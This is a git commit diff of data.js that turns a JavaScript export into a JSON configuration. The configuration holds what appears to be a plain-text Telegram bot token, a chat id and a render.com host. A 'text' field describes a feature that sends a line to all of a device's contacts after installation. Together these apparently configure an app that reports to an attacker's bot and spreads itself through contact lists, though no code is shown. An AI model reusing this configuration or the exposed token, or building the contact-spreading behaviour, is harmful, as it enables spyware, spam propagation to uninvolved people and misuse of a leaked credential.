c4b30dd1748d2dc4b1c18b38dd0288a57afdbb17
Violentqm <79298794+violentqm@users.noreply.github.com>
2025-09-20 13:17:21 -0700

    Update data.js

--- data.js
+++ data.js
@@ -1,5 +1,6 @@
-module.exports = {
-  token: "8153232309:AAHiGdFKJjQZBybgLnnBHEXBrngvC8lVBmY",
-  id:"5707089305",
-  address:"https://ninef192f21.onrender.com"
-};
+{
+    "token": "8153232309:AAHiGdFKJjQZBybgLnnBHEXBrngvC8lVBmY",
+    "id": "5707089305",
+    "host": "https://ninef192f21.onrender.com/",
+    "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
+}
